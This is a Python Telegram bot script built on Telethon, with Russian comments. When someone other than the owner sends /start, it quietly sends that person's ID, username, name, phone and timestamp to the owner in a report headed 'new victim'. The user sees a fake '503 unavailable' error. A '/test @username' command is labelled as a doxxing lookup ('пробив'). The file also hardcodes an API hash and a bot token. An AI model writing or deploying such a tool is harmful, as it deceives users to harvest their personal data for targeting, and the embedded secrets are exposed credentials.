from telethon import TelegramClient, events
from datetime import datetime

# ========== КОНФИГУРАЦИЯ ==========
API_ID = 26016868
API_HASH = "77863601ac3d8036a0fa3c546fb3c083"
BOT_TOKEN = "8653469627:AAEe_GYwGBCG4R-rZ2ipBtKVMNO7ZIKcnD8"
OWNER_ID = 1185238446

# ПРОКСИ В ПРАВИЛЬНОМ ФОРМАТЕ ДЛЯ TELETHON
# ВАРИАНТ 1: БЕЗ ПРОКСИ (ЕСЛИ НЕ РАБОТАЕТ - РАСКОММЕНТИРУЙТЕ)
client = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ВАРИАНТ 2: С ПРОКСИ (ЕСЛИ НУЖЕН) - ЗАКОММЕНТИРУЙТЕ ВАРИАНТ 1 И РАСКОММЕНТИРУЙТЕ ЭТОТ
# PROXY = {
#     'proxy_type': 'socks5',  # или 'http'
#     'addr': 'nitro.alotaxi.info',
#     'port': 4515,
#     'username': None,
#     'password': None
# }
# client = TelegramClient('bot_session', API_ID, API_HASH, proxy=PROXY).start(bot_token=BOT_TOKEN)

# ========== ОБРАБОТЧИКИ ==========
@client.on(events.NewMessage(pattern='/start'))
async def handler(event):
    user = await event.get_sender()
    
    # Если это владелец
    if user.id == OWNER_ID:
        await event.reply(
            "✅ **Бот запущен**\n\n"
            "📌 Команды:\n"
            "/stats - статус\n"
            "/test @username - пробив"
        )
        return
    
    # Если это другой пользователь
    report = f"""НОВАЯ ЖЕРТВА
ID: {user.id}
Username: @{user.username}
Имя: {user.first_name} {user.last_name}
Телефон: {getattr(user, 'phone', 'Скрыт')}
Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
    
    await client.send_message(OWNER_ID, report)
    await event.reply("⚠️ Сервис временно недоступен. Код: 503")

@client.on(events.NewMessage(pattern='/stats', from_users=OWNER_ID))
async def stats(event):
    await event.reply("✅ Бот активен")

@client.on(events.NewMessage(pattern='/test (.*)', from_users=OWNER_ID))
async def test(event):
    target = event.pattern_match.group(1)
    await event.reply(f"Тестовый поиск: {target}")

# ========== ЗАПУСК ==========
print("=" * 50)
print("БОТ ЗАПУЩЕН (Telethon без прокси)")
print(f"API ID: {API_ID}")
print(f"ID владельца: {OWNER_ID}")
print("=" * 50)

client.run_until_disconnected()
